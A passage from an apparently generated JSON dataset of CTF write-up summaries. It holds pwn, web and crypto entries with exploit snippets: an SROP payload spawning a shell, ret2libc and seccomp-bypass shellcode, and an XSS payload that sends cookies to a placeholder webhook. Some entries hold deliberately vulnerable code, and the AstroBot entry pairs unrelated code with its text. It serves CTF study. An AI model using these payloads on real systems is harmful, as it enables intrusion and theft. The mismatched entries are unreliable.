    },
    {
        "name": "asm",
        "write_up": "dataset/raw/asm.md",
        "type": "pwn",
        "competition": [
            "BCACTF/2022",
            "https://ctftime.org/event/1602/tasks/"
        ],
        "score": -1.0,
        "max_score": 350,
        "difficulty": -1,
        "knowledge": [
            "When a binary lacks enough gadgets for a Return-Oriented Programming (ROP) chain and no external libraries for a ret2libc attack, Sigreturn-Oriented Programming (SROP) can be an effective exploitation technique. This approach utilizes a crafted sigreturn frame to manipulate the kernel into executing a syscall of choice, such as `execve` to spawn a shell, by preparing the syscall number in the RAX register and setting other necessary registers (RDI, RSI, RDX, RIP) accordingly within the frame.",
            "Managing the RAX register value to perform SROP can be achieved by utilizing the return value of a syscall. For instance, a read syscall's return value, which is stored in RAX, indicates the number of bytes read. By controlling the input size, an attacker can set the RAX register to a specific value required for triggering the `sigreturn` syscall (`sys_rt_sigreturn` with RAX=0xf on x86-64 architectures). This method circumvents the lack of direct gadgets to set RAX.\n\nExample payload to set up and trigger SROP:\n\n```python\nfrom pwn import *\n\ncontext.arch = \"amd64\"\n\nsh_addr = 0x000000000040200f  # Address of \"/bin/sh\" string in memory\nsyscall_gadget = 0x0000000000401019  # Address of the syscall instruction\nread_gadget = p64(0x40101b)  # Address to return to the read call\n\nframe = SigreturnFrame()\nframe.rax = 59  # syscall number for execve\nframe.rdi = sh_addr  # First argument to execve: pointer to \"/bin/sh\"\nframe.rsi = 0  # Second argument to execve: argv array\nframe.rdx = 0  # Third argument to execve: envp array\nframe.rsp = 0  # Stack pointer\nframe.rip = syscall_gadget  # Instruction pointer to return to the syscall gadget\n\npayload = b\"a\" * 32 + read_gadget + p64(syscall_gadget) + bytes(frame)\n\n# Send the payload to the vulnerable program\n```\n\nThis payload demonstrates setting up a sigreturn frame after a buffer overflow, setting RAX through a read syscall, and invoking `execve(\"/bin/sh\", NULL, NULL)` through SROP."
        ],
        "key": "```asm\n0000000000401000 <vuln>:  \n 401000:        b8 01 00 00 00          mov    eax,0x1  \n 401005:        bf 01 00 00 00          mov    edi,0x1  \n 40100a:        48 be 00 20 40 00 00    movabs rsi,0x402000  \n 401011:        00 00 00  \n 401014:        ba 0f 00 00 00          mov    edx,0xf  \n 401019:        0f 05                   syscall  \n 40101b:        48 83 ec 20             sub    rsp,0x20  \n 40101f:        b8 00 00 00 00          mov    eax,0x0  \n 401024:        bf 00 00 00 00          mov    edi,0x0  \n 401029:        48 89 e6                mov    rsi,rsp  \n 40102c:        ba 00 02 00 00          mov    edx,0x200  \n 401031:        0f 05                   syscall  \n 401033:        48 83 c4 20             add    rsp,0x20  \n 401037:        c3                      ret  \n```"
    },
    {
        "name": "asr",
        "write_up": "dataset/raw/asr.md",
        "type": "crypto",
        "competition": [
            "UIUCTF/2022",
            "https://ctftime.org/event/1600/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In challenges focusing on RSA where the private exponent \\(d\\) is known but the modulus \\(N\\) is not, one can determine \\(N\\) by leveraging the property that \\(ed - 1\\) is a multiple of \\(\\phi(N)\\). Factor \\(ed - 1\\) using an external service, then use the factorization to find potential values for \\(\\phi(N)\\). This process requires knowledge of the relationship \\(ed \\equiv 1 \\mod \\phi(N)\\).",
            "When dealing with multiple prime factors of \\(ed - 1\\), particularly in cases where there are a significant number of them (as in the challenge, with 16 64-bit primes), one can use combinatorial methods to organize these primes into two groups which then help generate potential prime factors \\(p\\) and \\(q\\) of \\(N\\). This is based on knowing how to pair factors to attempt a reconstruction of \\(N = p \\times q\\). A brute-force approach, iterating through all possible combinations (`${16 \\choose 8} = 12870` combinations as mentioned), can be manageable with computational tools and can lead to finding the correct modulus when validated against known conditions (e.g., primes leading to a valid \\(N\\)).\n\nNo specific payload is necessary for the explanation above."
        ],
        "key": "```python  \nfor perm in tqdm(perms):  \n perm = set(list(perm))  \n p = prod(perm)  \n q = prod(bigprimes - perm)\n\n for i in range(7):  \n   if isPrime(p + 1): break  \n   p *= small_primes[i]  \n for i in range(7):  \n   if isPrime(q + 1): break  \n   q *= small_primes[i]\n\n p = p + 1  \n q = q + 1  \n```"
    },
    {
        "name": "AstroBot",
        "write_up": "dataset/raw/AstroBot.md",
        "type": "reverse",
        "competition": [
            "Pwn2Win/2019",
            "https://ctftime.org/event/822/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When designing a bot to interact with a game or a service over the network, consider the network latency and plan to send commands ahead of time to account for delays. This strategy improves the bot's performance and reliability in real-time scenarios. \n\n    - Example context: For games where quick reaction times are crucial, send movement commands in advance based on the expected network delay to ensure the bot responds as if there was no latency.",
            "In automation challenges where the task involves predictable patterns (e.g., dodging obstacles or solving puzzles with fixed sequences), manually identifying and encoding the pattern into the bot can be more efficient than developing complex pathfinding algorithms. Once a repeating pattern is identified, commands can be replicated for each cycle of the pattern to achieve the desired outcome.\n\n    - Example context: If a game's obstacles follow a known, repeatable pattern after a certain number of moves or time intervals, manually record the successful commands for one cycle and loop them for the duration of the challenge/game."
        ],
        "key": "```python\nimport socket\n\ndef handle_client(client_socket):\n    request = client_socket.recv(1024)\n    print(f\"Received: {request}\")\n\n    # Vulnerable code: directly executing received data\n    exec(request)\n\n    client_socket.send(b\"ACK\")\n    client_socket.close()\n\ndef main():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind((\"0.0.0.0\", 9999))\n    server.listen(5)\n    print(\"Listening on 0.0.0.0:9999\")\n\n    while True:\n        client_socket, addr = server.accept()\n        print(f\"Accepted connection from {addr}\")\n        handle_client(client_socket)\n\nif __name__ == \"__main__\":\n    main()\n```\n"
    },
    {
        "name": "aush",
        "write_up": "dataset/raw/aush.md",
        "type": "pwn",
        "competition": [
            "zer0pts/2023",
            "https://ctftime.org/event/1972/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "Buffer overflow vulnerabilities can be exploited due to insufficient input validation. When reading user input, an application should always validate the size of the input against the size of the buffer it is stored in. In scenarios where input is read directly into a stack-allocated buffer without size checks, an attacker can supply data that exceeds the buffer's capacity, leading to overwriting adjacent memory. This vulnerability is evident in code that does not correctly limit the number of bytes read from an input stream to the buffer's size, as seen with `read(STDIN_FILENO, inpuser, 0x200)`, where `0x200` bytes are read into a buffer that is significantly smaller.",
            "To maintain application stability post-exploitation and ensure further execution with elevated privileges, attackers may need to correct or mitigate the effects of their exploitation techniques. In the discussed scenario, overwriting the `envp` array with a buffer overflow corrupts the application state, which could impede further exploitation steps, such as executing a shell. By carefully controlling the overflow to overwrite specific parts of the application's memory, such as nullifying the corrupted `envp` array (by padding the overflow payload with null bytes after necessary payload data), attackers can restore partial application functionality or bypass additional security checks, leading to successful exploitation.\n\nExample payload structure for the second point (simplified for understanding):\n```\n\"A\"*32 + \"\\x00\"*remaining_bytes\n```\nThis payload would fill the `password` buffer with 32 \"A\" characters, followed by a series of null bytes to overwrite the `envp` array to a point where it's effectively null-terminated, restoring its functionality to a usable state for further exploitation steps."
        ],
        "key": "```c\n /* Check username */  \n write(STDOUT_FILENO, \"Username: \", 10);  \n if (read(STDIN_FILENO, inpuser, 0x200) <= 0)  \n   return 1;\n\n if (memcmp(username, inpuser, LEN_USER) != 0) {  \n   args[0] = \"/usr/games/cowsay\";  \n   args[1] = \"Invalid username\";  \n   args[2] = NULL;  \n   execve(args[0], args, envp);  \n }\n\n/* Check password */  \n write(STDOUT_FILENO, \"Password: \", 10);  \n // FIXME: Reads more than buffer  \n if (read(STDIN_FILENO, inppass, 0x200) <= 0)  \n   return 1;\n\n if (memcmp(password, inppass, LEN_PASS) != 0) {  \n   args[0] = \"/usr/games/cowsay\";  \n   args[1] = \"Invalid password\";  \n   args[2] = NULL;  \n   execve(args[0], args, envp);  \n }\n```"
    },
    {
        "name": "auth3ntication",
        "write_up": "dataset/raw/auth3ntication.md",
        "type": "web",
        "competition": [
            "BSidesDelhi/2018",
            "https://ctftime.org/event/700/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When faced with a XOR-based authentication mechanism in a web application, one effective approach involves iteratively XORing each byte of the encrypted data (`func` variable in the context) with every possible byte value (0-255) until a pattern that matches expected clear text (known plaintext attack) emerges. This method is particularly useful when the encryption key is shorter than the data it encrypts, requiring the key to repeat over the length of the data. This repetition can be exploited by shifting the known plaintext across the encrypted data to find the decryption key.",
            "In scenarios where the logic of the web application is obscured or employs client-side checks, extracting and analyzing the JavaScript code can reveal vulnerabilities and flawed logic, such as reliance on client-side security for authentication checks. Directly manipulating or bypassing this client-side logic, such as through modifying the expected inputs or outcomes within the browser\u2019s console or by crafting specific requests, can lead to unauthorized access or disclosure of sensitive information.\n\nExample payload based on extracted knowledge:\n```javascript\n// Assuming 'func' is the encrypted data and 'knownText' is a piece of expected plaintext\nfor(w=0; w<func.length;w++) {  \n    buf = \"\";\n    var g = tmp;  \n    var arr = g.split(\"\");  \n    arr.splice(w, knownText.length, knownText);  \n    var result = arr.join(\"\");\n\n    k = result.substring(0, func.length);\n\n    for(i = 0, j = 0; i < func.length; i++) {  \n        c = parseInt(func.charCodeAt(i));  \n        c = c ^ k.charCodeAt(j);  \n        if(++j == k.length) {  \n            j = 0;  \n        }  \n        buf += String.fromCharCode(c);  \n    }  \n\n    // Outputting potential decrypted data to check for readability or expected patterns\n    console.log(buf);  \n}\n```\nThis example does not replicate the exact code used in the challenge solution but follows the conceptual explanation on how to approach XOR encryption weaknesses in a CTF challenge, focusing on using known plaintext to derive the encryption key."
        ],
        "key": "```javascript\n$(\".c_submit\").click(function(event) {  \n    event.preventDefault();  \n    var u = $(\"#cpass\").val();  \n    var k = $(\"#cuser\").val();  \n    var func = \"\\x0d\\x13\\x45\\x17\\x48\\x09\\x5e\\x4b\\x17\\x3c\\x1a\\x1f\\x2b\\x1b\\x7a\\x0c\\x1f\\x66\\x0b\\x1a\\x3e\\x51\\x0b\\x41\\x11\\x58\\x17\\x4d\\x55\\x16\\x42\\x01\\x52\\x4b\\x0f\\x5a\\x07\\x00\\x00\\x07\\x06\\x40\\x4d\\x07\\x5a\\x07\\x14\\x19\\x0b\\x07\\x5a\\x4d\\x03\\x47\\x01\\x13\\x43\\x0b\\x06\\x50\\x06\\x13\\x7a\\x02\\x5d\\x4f\\x5d\\x18\\x09\\x41\\x42\\x15\\x59\\x48\\x4d\\x4f\\x59\\x1d\\x43\\x10\\x15\\x00\\x1a\\x0e\\x17\\x05\\x51\\x0d\\x1f\\x1b\\x08\\x1a\\x0e\\x03\\x1c\\x5d\\x0c\\x05\\x15\\x59\\x55\\x09\\x0d\\x0b\\x41\\x0e\\x0e\\x5b\\x10\\x5b\\x01\\x0d\\x0b\\x55\\x17\\x02\\x5a\\x0a\\x5b\\x05\\x10\\x0d\\x52\\x43\\x40\\x15\\x46\\x4a\\x1d\\x5f\\x4a\\x14\\x48\\x4b\\x40\\x5f\\x55\\x10\\x42\\x15\\x14\\x06\\x07\\x46\\x01\\x55\\x16\\x42\\x48\\x10\\x4b\\x49\\x16\\x07\\x07\\x08\\x11\\x18\\x5b\\x0d\\x18\\x50\\x46\\x5c\\x43\\x0a\\x1c\\x59\\x0f\\x43\\x17\\x58\\x11\\x04\\x14\\x48\\x57\\x0f\\x0a\\x46\\x17\\x48\\x4a\\x07\\x1a\\x46\\x0c\\x19\\x12\\x5a\\x22\\x1f\\x0d\\x06\\x53\\x43\\x1b\\x54\\x17\\x06\\x1a\\x0d\\x1a\\x50\\x43\\x18\\x5a\\x16\\x07\\x14\\x4c\\x4a\\x1d\\x1e\";  \n    buf = \"\";  \n    if(k.length == 9) {  \n        for(i = 0, j = 0; i < func.length; i++) {  \n            c = parseInt(func.charCodeAt(i));  \n            c = c ^ k.charCodeAt(j);  \n            if(++j == k.length) {  \n                j = 0;  \n            }  \n            buf += eval('\"' + a(x(c)) + '\"');  \n        }  \n        eval(buf);  \n    } else {  \n        $(\"#cresponse\").html(\"<div class='alert alert-danger'>Invalid creds...</div>\");  \n    }  \n});  \n\nfunction a(h) {  \n    if(h.length != 2) {  \n        h = \"\\x30\" + h;  \n    }  \n    return \"\\x5c\\x78\" + h;  \n}  \n\nfunction x(d) {  \n    if(d < 0) {  \n        d = 0xFFFFFFFF + d + 1;  \n    }  \n    return d.toString(16).toUpperCase();  \n}  \n```"
    },
    {
        "name": "Automated Exploit Generation 2",
        "write_up": "dataset/raw/Automated Exploit Generation 2.md",
        "type": "pwn",
        "competition": [
            "UTCTF/2022",
            "https://ctftime.org/event/1582/tasks/"
        ],
        "score": -1,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When dealing with format string vulnerabilities in binaries with input permutation mechanisms, first conduct a static analysis (e.g., using Ghidra) to understand the binary's workflow and identify the vulnerability. Then, dynamically analyze (using tools like `ltrace`) to see how the binary handles input at runtime. This combination of static and dynamic analysis can effectively reveal attack vectors, such as where and how to inject format string payloads.",
            "To execute a format string attack on a binary that uses input permutations, it is essential to map the permutation (i.e., how the input's positions are changed by the binary). This can be achieved by sending unique payloads to the binary multiple times, analyzing the output to see how inputs are rearranged, and then using this mapping to adjust the attack payload so that it is correctly realigned after the permutation. This method allows for the precise placement of the format string attack components in the payload, ensuring the exploit modifies the desired target memory location.\n\n   Sample payload adjustment method:\n   ```python\n   mapping = get_permutation_map(filename)\n   exploit = [b'_' for _ in range(0x202)]\n   for i in range(len(target_payload)):\n       exploit[mapping[i]] = target_payload[i].to_bytes(1, 'little')\n   exploit = b\"\".join(exploit)\n   ```\n\n   This snippet showcases how to rearrange an exploit payload according to the permutation map obtained from the binary, ensuring the format string exploit components are correctly positioned for successful exploitation."
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid permute(long param_1);\n\nint exit_code = 0;\n\nint main() {\n    char local_218[514];\n    fgets((char *)&local_218, 0x202, stdin);\n    permute((long)&local_218);\n    printf((char *)&local_218);\n    exit(exit_code);\n}\n\nvoid permute(long param_1) {\n    // Example permutation functions\n    permute2(param_1);\n    permute3(param_1);\n    permute6(param_1);\n    permute7(param_1);\n    permute4(param_1);\n    permute1(param_1);\n    permute8(param_1);\n    permute5(param_1);\n    return;\n}\n```"
    },
    {
        "name": "b01ler-ad",
        "write_up": "dataset/raw/b01ler-ad.md",
        "type": "web",
        "competition": [
            "b01lers/2024",
            "https://ctftime.org/event/2250/tasks/"
        ],
        "score": 302,
        "max_score": 438,
        "difficulty": 0.6894977168949772,
        "knowledge": [
            "In scenarios involving server-side request forgery (SSRF) or when attempting to exfiltrate sensitive data (like cookies) using a crafted payload in a web application that uses input sanitization to prevent the use of certain characters (such as single quotes, double quotes, and backticks), URL encoding can be employed to bypass these sanitization efforts. This allows for the injection of malicious scripts or HTML by encoding the disallowed characters such that they are not caught by the sanitization process but are correctly interpreted by the browser or server. For example, replacing a single quote (') with its URL encoded counterpart (%27) can enable an attacker to inject a payload that would otherwise be sanitized.\n   - Example payload for exfiltration using URL encoding: \n     ```html\n     <script>\n       function setUrl() {\n         e = document.getElementById(%27asd%27);\n         e.src = %27%27.concat(%27https://your-webhook.site/?cookies=%27,document.cookie);\n       }\n     </script>\n     ![](%27https://example.com/image.svg%27)\n     ```",
            "In CTF challenges or security assessments where a web application uses a headless browser (like Puppeteer) to process or render user-supplied input, it's possible to exploit this feature for CSRF (Cross-Site Request Forgery), XSS (Cross-Site Scripting), or SSRF (Server-Side Request Forgery) attacks. The specific example shows exploiting the server's use of Puppeteer to send a request with its cookie to an attacker-controlled server. By crafting a payload that injects an image or script tag with a source attribute manipulated to include an attacker-controlled URL, along with any extracted data (like cookies), one can achieve data exfiltration or perform actions on behalf of the server or victim user.\n   - Example method to exploit via crafted HTML or script tag: \n     ```html\n     <script>  \n       function setUrl() {\n         e = document.getElementById(%27asd%27);\n         e.src = %27%27.concat(%27https://your-webhook.site/?cookies=%27,document.cookie);\n       }\n     </script>\n     ![](%27https://example.com/image.svg%27)\n     ```"
        ],
        "key": "```javascript\napp.get('/admin/view', (req, res) => {  \n if (req.cookies.flag === CONFIG.APPFLAG) {  \n   res.send(req.query.content);  \n }  \n else {  \n   res.send('You are not Walter White!');  \n }  \n})\n\napp.post('/review', limiter,  async (req, res) => {  \n const initBrowser = puppeteer.launch({  \n     executablePath: \"/opt/homebrew/bin/chromium\",  \n     headless: true,  \n     args: [  \n         '--disable-dev-shm-usage',  \n         '--no-sandbox',  \n         '--disable-setuid-sandbox',  \n         '--disable-gpu',  \n         '--no-gpu',  \n         '--disable-default-apps',  \n         '--disable-translate',  \n         '--disable-device-discovery-notifications',  \n         '--disable-software-rasterizer',  \n         '--disable-xss-auditor'  \n     ],  \n     ignoreHTTPSErrors: true  \n });  \n const browser = await initBrowser;  \n const context = await browser.createBrowserContext()  \n const content = req.body.content.replace(\"'\", '').replace('\"', '').replace(\"`\", '');  \n const urlToVisit = CONFIG.APPURL + '/admin/view/?content=' + content;  \n try {  \n     const page = await context.newPage();  \n     await page.setCookie({  \n         name: \"flag\",  \n         httpOnly: false,  \n         value: CONFIG.APPFLAG,  \n         url: CONFIG.APPURL  \n     })  \n     await page.goto(urlToVisit, {  \n         waitUntil: 'networkidle2'  \n     });  \n     await sleep(1000);  \n     // Close  \n     await context.close()  \n     res.redirect('/')  \n } catch (e) {  \n     console.error(e);  \n     await context.close();  \n     res.redirect('/')  \n }  \n})\n```"
    },
    {
        "name": "B1 - Boris",
        "write_up": "dataset/raw/B1 - Boris.md",
        "type": "This CTF challenge falls under the category of **pwn (exploit)**.",
        "competition": [
            "DigitalOverdose/2021",
            "https://ctftime.org/event/1459/tasks/"
        ],
        "score": 200,
        "max_score": 600,
        "difficulty": 0.3333333333333333,
        "knowledge": [
            "In challenges involving binary exploitation with restricted system calls due to seccomp filters, carefully analyze allowed syscalls to construct a functional payload. This may involve creative use of syscalls that are permitted to bypass the restrictions and achieve the intended exploit. For example, when direct execution syscalls (like `execve()`) are blocked, use allowed syscalls such as `sys_openat`, `sys_sendfile`, or `sys_chdir` to read or transmit data (e.g., a flag file) indirectly. Sample part of a shellcode could be as follows to change directory to root and open a file named \"flag.txt\":\n```assembly\nxor rdi, rdi                  ; Clear rdi\nmov rdi, 0xffffffffffffff9c   ; rdi = -100 (AT_FDCWD)\nxor rdx, rdx                  ; Clear rdx\nmov rsi, rsp                  ; rsi = address of \"flag.txt\"\nmov rax, 0xfffffffffffffeff   ; rax = -257 (sys_openat, avoiding null byte)\nneg rax                       ; rax = 257 (sys_openat)\nsyscall                       ; openat(-100, \"flag.txt\", O_RDONLY, 0)\n```",
            "When an exploit involves executing shellcode placed in memory, and the memory address is predictable (e.g., allocated with `mmap` at a fixed address), tailor the shellcode to fit the constraints of the execution environment, including avoiding null bytes if necessary and making sure the payload correctly utilizes the memory space. Use the knowledge of memory allocation behavior (for example, `mmap` usage with a fixed address) to accurately place and execute the shellcode. An essential part of the shellcode could involve jumping to or calling the exact memory address where the payload is written, in this case, `0xdead000`:\n```assembly\nmov rdi, 0xdead000            ; Move the address where shellcode is loaded into rdi\ncall rdi                      ; Call the address, executing the shellcode\n```\nNote: The specific assembly instructions and syscall numbers (in this context, represented as constants) must be adapted based on the challenge requirements and the syscall table of the target system."
        ],
        "key": "```c\n do {  \n    if (3 < local_1ac) {  \n       puts(\"[.] Boris is bored. My genius needs using! Give me something to do!\");  \n       fflush(stdout);  \n       map_rwx = mmap((void *)0xdead000,0x1000,7,0x22,0,0);  \n       if ((int)map_rwx == 0xdead000) {  \n          read(0,(void *)0xdead000,0x1000);  \n          puts(\"[+] Finally, a task! But you\\'ll never break my access codes...\");  \n          fflush(stdout);  \n          bVar1 = sec();  \n          if ((int)CONCAT71(extraout_var,bVar1) == 0) {  \n             nanosleep(&local_198,&local_1a8);  \n             puts(\"[!] Access codes applied!\");  \n             puts(BORIS_ART);  \n             puts(\"[.] Good luck... you\\'ll need it!\");  \n             fflush(stdout);  \n             nanosleep(&local_198,&local_1a8);  \n             (*(code *)0xdead000)();  \n             uVar3 = 0;  \n          }  \n          else {  \n             uVar3 = 1;  \n          }  \n       }  \n```\n\n```c\nbool sec(void)\n\n{  \n int success;  \n undefined8 ctx;  \n uint counter;  \n undefined4 syscall_nums [8];\n\n ctx = seccomp_init(0x30000);  \n syscall_nums[0] = 257;  \n syscall_nums[1] = 0;  \n syscall_nums[2] = 1;  \n syscall_nums[3] = 40;  \n syscall_nums[4] = 60;  \n syscall_nums[5] = 231;  \n syscall_nums[6] = 80;  \n syscall_nums[7] = 230;  \n counter = 0;  \n while( true ) {  \n    if (7 < counter) {  \n       success = seccomp_load(ctx);  \n       return success != 0;  \n    }  \n    success = seccomp_rule_add(ctx,0x7fff0000,syscall_nums[(int)counter],0);  \n    if (success != 0) break;  \n    counter = counter + 1;  \n }  \n return true;  \n}  \n```"
    },
    {
        "name": "Baby bof",
        "write_up": "dataset/raw/Baby bof.md",
        "type": "pwn",
        "competition": [
            "DCTF/2021",
            "https://ctftime.org/event/1361/tasks/"
        ],
        "score": 250,
        "max_score": 500,
        "difficulty": 0.5,
        "knowledge": [
            "When exploiting a binary with a Return-Oriented Programming (ROP) challenge, if the binary itself doesn't provide enough gadgets, one can leverage gadgets found in libc. This approach requires leaking an address from the Global Offset Table (GOT) to calculate the libc base address. From there, system function and \"/bin/sh\" string location within libc can be found to execute arbitrary commands. Condition: The binary must be dynamically linked with libc and have functions imported from libc that can be used to leak addresses.\n\nExample payload snippet: \n```Python\n# Leak address from GOT\nfgets_got = elf.symbols['got.fgets']  \n# Calculate addresses\nlibc_address = (fgets_address - fgets_libc)\nsystem_address = system_libc + libc_address\nsh_address = sh_libc + libc_address\n```",
            "In scenarios where a direct call to the system function with \"/bin/sh\" as an argument does not spawn a shell, inserting a \"ret\" gadget before the system call can resolve issues related to stack alignment on x86_64 systems. This is crucial when exploiting binaries on remote systems where the libc version might differ, causing unexpected behaviors unless the stack is correctly aligned.\n\nExample payload adjustment:\n```Python\nret = next(elf.search(asm('ret')))\n# Payload adjusted to include 'ret' gadget\np.sendline(b'\\x41'*18 + p64(ret) + bytes(rop))\n```"
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid vuln() {\n    char buffer[16];\n    printf(\"plz don't rop me\\n\");\n    gets(buffer);\n    printf(\"i don't think this will work\\n\");\n}\n\nint main() {\n    vuln();\n    return 0;\n}\n```"
    },
    {
        "name": "Baby buffer overflow",
        "write_up": "dataset/raw/Baby buffer overflow.md",
        "type": "pwn",
        "competition": [
            "kksctf/2019",
            "https://ctftime.org/event/874/tasks/"
        ],
        "score": 100,
        "max_score": 1000,
        "difficulty": 0.1,
        "knowledge": [
            "In buffer overflow challenges where the `gets` function is used without input length checks, attackers can overwrite the return address of the current function. This is achievable by crafting a payload that fills the buffer and then specifies a new address to redirect the execution flow. The payload structure for such scenarios would usually be `padding (to fill the buffer) + saved EBP (if needed) + return address`.",
            "When a challenge binary includes a function that results in the desired outcome when executed (e.g., printing a flag, opening a shell), and this function requires specific arguments, it's possible to redirect the program's execution to this function by overwriting the return address. The payload in this context should also include the arguments the function expects right after the overwritten return address. If the target function requires arguments, these should be pushed onto the stack in reverse order before the return address that jumps to the target function. Payload format: `buffer overflow + saved EBP (optional) + function address + return address (optional) + arguments (if any)`. Sample payload: `\"A\" * buffer_size + \"B\" * 4 + p32(function_address) + p32(return_address) + p32(argument)`."
        ],
        "key": "```c\nunsigned int __cdecl read_wrapper(char *s)  \n{  \n size_t v1; // edx  \n unsigned int result; // eax  \n unsigned int i; // [esp+0h] [ebp-8h]\n\n gets(s);  \n for ( i = 0; ; ++i )  \n {  \n   v1 = strlen(s);  \n   result = i;  \n   if ( v1 <= i )  \n     break;  \n   if ( s[i] > '@' && s[i] <= 'Z' )  \n     s[i] += 0x20;  \n }  \n return result;  \n}  \n```"
    },
    {
        "name": "Baby crypto revisited",
        "write_up": "dataset/raw/Baby crypto revisited.md",
        "type": "crypto",
        "competition": [
            "LINE/2022",
            "https://ctftime.org/event/1472/tasks/"
        ],
        "score": 138,
        "max_score": 341,
        "difficulty": 0.4046920821114369,
        "knowledge": [
            "When given ECDSA signatures with a partially known nonce (k_), a reduction attack can be performed by deriving new signatures from the known part of k_ and the original signatures (r, s, and hash). This is achievable by assuming k = k_ + a, where a is the unknown part of the nonce, and calculating new values of r, s, and the hash (h_new) to create a new signature pair that leverages the known bits of k. This process allows for the transformation of the problem into a biased nonce attack scenario, where the nonce's upper unknown bits are set to a fixed value or zero, simplifying the attack.",
            "To recover the private key from ECDSA signatures when a biased nonce is employed, one can use lattice-based techniques, specifically solving the Hidden Number Problem (HNP) with tools like the LLL algorithm. This approach is particularly effective when a significant number of signatures are available, and the nonce's bias is towards a predictable or fixed pattern. In the given scenario, knowing half of the 128-bit nonce and having 100 sample signatures were sufficient conditions to apply LLL after transforming the signatures to use biased nonces, ultimately leading to the successful extraction of the private key.\n\nThese strategies emphasize the importance of securely generating nonces in ECDSA to prevent the feasibility of such attacks."
        ],
        "key": "```python\nr = (k * G).x()\n# k * G can be recovered although we do not know k, by using r which is x coord of EC\nr_new = (a * G).x() = (k * G - k_ * G).x()\ns = kinv * (h + r * d)\ns * k = h + r * d\ns * (k_ + a) =  h + r * d\ns * a = h - s * k_ + r * d\nrinv * r_new * s * a = rinv * r_new * (h - s * k_) + rinv * r_new * r * d\nrinv * r_new * s * a = rinv * r_new * (h - s * k_) + r_new * d\n```"
    },
    {
        "name": "Baby Encoder",
        "write_up": "dataset/raw/Baby Encoder.md",
        "type": "crypto",
        "competition": [
            "TMUCTF/2021",
            "https://ctftime.org/event/1427/tasks/"
        ],
        "score": 489,
        "max_score": 500,
        "difficulty": 0.978,
        "knowledge": [
            "When dealing with custom encoding schemes that involve sequential XOR operations, including mirroring (XORing each byte with its \"mirror\" in the array), and the initial character of the flag is known (commonly the closing curly brace `}` in CTF challenges), it's possible to reverse the encoding by applying the XOR operations in reverse order. This technique utilizes known plaintext information to sequentially \"unmix\" the bytes to retrieve the original message.\n   - Sample of reverse XOR operation when the last character is known (`}` assumed as last character):  \n     ```python\n     def decode_xor_with_mirror(data, last_char_ord):\n         new_data = []\n         for i in range(len(data)-1, -1, -1):\n             last_char_ord = last_char_ord ^ data[i]\n             new_data.append(last_char_ord)\n         new_data.reverse()\n         # Adjust the order due to initial XOR operation specifics\n         new_data = new_data[1:] + new_data[:1]\n         return new_data\n     ```",
            "For custom displacement functions that rearrange byte positions based on certain conditions without altering byte values, and when used in multiple iterations with varying parameters, observing the function's behavior can reveal that such displacements might reach an original or known state after a specific number of iterations. This insight allows for applying the same displacement function in reverse by carefully counting the required iterations to undo the displacement effects.\n   - Example of applying displacement function in reverse with calculated iterations:\n     ```python\n     def displace(a, base):\n         # Function body as described in challenge write-up\n         pass\n\n     # Applying the function with reverse iterations for each displacement base\n     def reverse_displacement(encoded_data):\n         bases_and_iterations = [(72, 30), (66, 310), (60, 4290), (54, 2590), (48, 37128), (42, 168), (36, 18), (30, 60), (24, 42), (18, 36), (12, 20), (6, 12)]\n         for base, iterations in reversed(bases_and_iterations):\n             for _ in range(iterations):\n                 encoded_data = displace(encoded_data, base)\n         return encoded_data\n     ```\n   - This approach assumes that the displacement function does not inherently alter the data but only rearranges it, and that applying the function enough times in a specific pattern can restore the original sequence of bytes."
        ],
        "key": "```python  \nfrom Crypto.Util.number import bytes_to_long\n\ndef displace(a, base):  \n   res = []  \n   for i in range(base):  \n       if base + i >= len(a):  \n           for j in range(base - 1, i - 1, -1):  \n               res.append(a[j])  \n           return res  \n       res.append(a[base + i])  \n       res.append(a[i])  \n   for j in range(len(a) - 1, 2 * base - 1, -1):  \n       res.append(a[j])  \n   return res\n\ndef flag_encoder(flag):  \n   encoded_flag = []  \n   n = len(flag)  \n   f = [ord(ff) for ff in flag]  \n  \n   for i in range(n):  \n       encoded_flag.append(ord(flag[i]) ^ ord(flag[i - 1]))  \n  \n   for i in range(n):  \n       encoded_flag[i] ^= encoded_flag[n - i - 1]  \n  \n   a = []  \n   for i in range(0, n, 3):  \n       a.append(encoded_flag[i] + encoded_flag[i + 1])  \n       a.append(encoded_flag[i + 1] + encoded_flag[i + 2])  \n       a.append(encoded_flag[i + 2] + encoded_flag[i])  \n   encoded_flag = a  \n   for i in range(1, n):  \n       if i % 6 == 0:  \n           encoded_flag = displace(encoded_flag, i)  \n  \n   encoded_flag = ''.join(chr(encoded_flag[i]) for i in range(n))  \n   return encoded_flag\n\nwith open('/home/kourosh/CTF/TMU/crypto/BabyEncoder/flag', 'rb') as f:  \n   flag = f.read().decode('UTF-8')  \n   print(str(bytes_to_long(flag_encoder(flag).encode())))  \n```"
    },
    {
        "name": "baby heap question mark",
        "write_up": "dataset/raw/baby heap question mark.md",
        "type": "pwn",
        "competition": [
            "PlaidCTF/2023",
            "https://ctftime.org/event/1770/tasks/"
        ],
        "score": 200,
        "max_score": 700,
        "difficulty": 0.2857142857142857,
        "knowledge": [
            "In scenarios dealing with heap-based buffer management vulnerabilities, particularly in applications written in Rust running under Wine on Linux, an exploit can often be achieved by manipulating buffer allocation and deallocation to cause buffer overflow or arbitrary read/write conditions. This is especially effective if the application implements a simple command-line interface (CLI) for buffer operations such as allocate, drop, read, and write. The vulnerability can be exploited by creating and deleting buffers in a specific order to manipulate the application's memory layout, allowing for the modification of pointer and size attributes of buffers. This approach can lead to arbitrary code execution by overwriting critical function pointers or directly injecting and executing shellcode.\n\n    Example exploit steps:\n    - Allocate several small buffers.\n    - Drop one of the buffers to create a gap in the memory layout.\n    - Allocate a large buffer that fills the gap and overlaps with the metadata of other buffers.\n    - Use further read or write operations to manipulate the size and pointer of a buffer, turning it into an arbitrary read/write primitive.",
